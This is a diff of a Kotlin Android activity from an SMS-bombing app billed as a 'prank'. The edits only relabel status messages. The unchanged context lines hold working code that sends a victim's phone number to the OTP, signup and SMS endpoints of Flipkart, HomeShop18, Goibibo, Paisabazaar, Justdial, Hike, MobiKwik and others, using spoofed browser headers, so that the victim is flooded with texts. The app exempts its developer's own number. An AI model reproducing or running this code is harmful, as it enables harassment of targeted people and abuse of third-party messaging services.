@@ -78,7 +78,7 @@ class HomeActivity : AppCompatActivity() {
         dataChange("> Hack Started:")
 
         if (!isNetworkAvailable) {
-            dataChange("Please connect to network")
+            dataChange("Err: Please connect to network")
 
             return
         }
@@ -87,7 +87,7 @@ class HomeActivity : AppCompatActivity() {
             val pInfo = this.packageManager.getPackageInfo(packageName, 0)
             current = pInfo.versionCode
         } catch (e: PackageManager.NameNotFoundException) {
-            dataChange("> Data not found!!!")
+            dataChange("Err: Data not found!!!")
             e.printStackTrace()
         }
 
@@ -100,14 +100,14 @@ class HomeActivity : AppCompatActivity() {
                 interstitialAd!!.show()
                 interstitialAd!!.loadAd(adRequest)
             } else {
-                dataChange("Wait for 10-15 second.")
+                dataChange("??? Wait for 10-15 second.")
                 interstitialAd!!.loadAd(adRequest)
             }
         }, 60000)
 
         AwesomeNoticeDialog(this)
                 .setTitle("Warning")
-                .setMessage("I(Developer of this app) is not responcible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
+                .setMessage("I(Developer of this app) is not responsible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
                 .setColoredCircle(R.color.dialogWarningBackgroundColor)
                 .setDialogIconAndColor(R.drawable.ic_dialog_warning, R.color.white)
                 .setCancelable(true)
@@ -136,13 +136,13 @@ class HomeActivity : AppCompatActivity() {
             mPhoneNumber = mPhoneEt.text.toString()
 
             if (TextUtils.isEmpty(mPhoneNumber)) {
-                dataChange("Please enter mobile number")
+                dataChange("??? Please enter mobile number")
                 Toast.makeText(this@HomeActivity,"isEmpty",Toast.LENGTH_SHORT).show()
                 return@OnClickListener
             }
 
             if (!isNetworkAvailable) {
-                dataChange("Please connect to network")
+                dataChange("Err: Please connect to network")
                 Toast.makeText(this@HomeActivity,"Network",Toast.LENGTH_SHORT).show()
 
                 return@OnClickListener
@@ -152,13 +152,13 @@ class HomeActivity : AppCompatActivity() {
                 interstitialAd!!.show()
             } else {
                 Toast.makeText(this@HomeActivity,"AdPro",Toast.LENGTH_SHORT).show()
-                dataChange("Please wait 10-15 second. Server is busy.")
+                dataChange("??? Please wait 10-15 second. Server is busy.")
                 interstitialAd!!.loadAd(adRequest)
                 return@OnClickListener
             }
 
             if (isDeveloperNumber(mPhoneNumber)) {
-                dataChange("Bombing on creator of this app does not make sense.")
+                dataChange("Err: Bombing on creator of this app does not make sense.")
                 Toast.makeText(this@HomeActivity,"Developer",Toast.LENGTH_SHORT).show()
                 return@OnClickListener
             }
@@ -168,7 +168,7 @@ class HomeActivity : AppCompatActivity() {
 
         findViewById<View>(R.id.contactBtn).setOnClickListener(View.OnClickListener {
             if (!isNetworkAvailable) {
-                dataChange("Please connect to network")
+                dataChange("Err: Please connect to network")
                 return@OnClickListener
             }
 
@@ -182,7 +182,7 @@ class HomeActivity : AppCompatActivity() {
             }
 
             override fun onAdFailedToLoad(errorCode: Int) {
-                dataChange("Errorcode : $errorCode")
+                dataChange("Err: Errorcode : $errorCode")
                 interstitialAd!!.loadAd(adRequest)
             }
 
@@ -228,7 +228,7 @@ class HomeActivity : AppCompatActivity() {
                     if (hours >= 3) {
                         flipkart()
                     } else {
-                        dataChange("This number is protected please tray again after some while.")
+                        dataChange("??? This number is protected please tray again after some while.")
                     }
                 } catch (e: ParseException) {
                     e.printStackTrace()
@@ -367,7 +367,7 @@ class HomeActivity : AppCompatActivity() {
         localOkHttpClient.newCall(Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                 homeshop18()
-                dataChange("Failure in homeshop18")
+                dataChange("Err: Failure in homeshop18")
             }
 
             override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
@@ -383,7 +383,7 @@ class HomeActivity : AppCompatActivity() {
         val localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "submit=submit&identity=$mPhoneNumber&otpType=SIGNUP_OTP")
         localOkHttpClient1.newCall(Request.Builder().url("https://mbe.homeshop18.com/services/secure/user/generate/otp").post(localRequestBody1).addHeader("x-hs18-app-version", "3.1.0").addHeader("x-hs18-app-id", "0").addHeader("x-hs18-device-version", "25").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("accept-charset", "UTF-8").addHeader("x-hs18-app-platform", "androidApp").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                dataChange(paramAnonymousIOException.localizedMessage)
+                dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                 snapdeal()
             }
 
@@ -405,7 +405,7 @@ class HomeActivity : AppCompatActivity() {
                 .addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest")
                 .addHeader("content-length", "62").addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                dataChange(paramAnonymousIOException.localizedMessage)
+                dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                 goibibo()
             }
 
@@ -421,7 +421,7 @@ class HomeActivity : AppCompatActivity() {
         val localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=$mPhoneNumber")
         localOkHttpClient3.newCall(Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                dataChange(paramAnonymousIOException.localizedMessage)
+                dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                 piasabazar()
             }
 
@@ -437,7 +437,7 @@ class HomeActivity : AppCompatActivity() {
         val localRequestBody11 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mobile_number=$mPhoneNumber&step=send_password&request_page=landing")
         localOkHttpClient11.newCall(Request.Builder().url("https://myaccount.paisabazaar.com/my-account/").post(localRequestBody11).addHeader("host", "myaccount.paisabazaar.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "application/json, text/javascript, */*; q=0.01").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://myaccount.paisabazaar.com/my-account/").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest").addHeader("content-length", "64").addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                dataChange(paramAnonymousIOException.localizedMessage)
+                dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                 justdial()
             }
 
@@ -452,7 +452,7 @@ class HomeActivity : AppCompatActivity() {
         val str = "https://www.justdial.com/functions/ajxandroid.php?phn=$mPhoneNumber&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile"
         OkHttpClient().newCall(Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                dataChange(paramAnonymousIOException.localizedMessage)
+                dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                 hike()
             }
 
@@ -473,7 +473,7 @@ class HomeActivity : AppCompatActivity() {
         val localRequestBody121 = RequestBody.create(localMediaType0, localJSONObject121.toString())
         localOkHttpClient121.newCall(Request.Builder().url("http://api.im.hike.in/v3/account/validate?digits=4").post(localRequestBody121).addHeader("content-type", "application/json; charset=utf-8").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                dataChange(paramAnonymousIOException.localizedMessage)
+                dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                 mobikwick()
             }
 
@@ -493,7 +493,7 @@ class HomeActivity : AppCompatActivity() {
         val localRequestBody001 = RequestBody.create(localMediaType001, localJSONObject001.toString())
         localOkHttpClient001.newCall(Request.Builder().url("https://appapi.mobikwik.com/p/account/otp/cell").post(localRequestBody001).addHeader("content-type", "application/json").addHeader("User-Agent", "").addHeader("X-App-Ver", "1").addHeader("X-MClient", "1").build()).enqueue(object : Callback {
             override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
-                dataChange(paramAnonymousIOException.localizedMessage)
+                dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                 confirmTKT()
             }
 
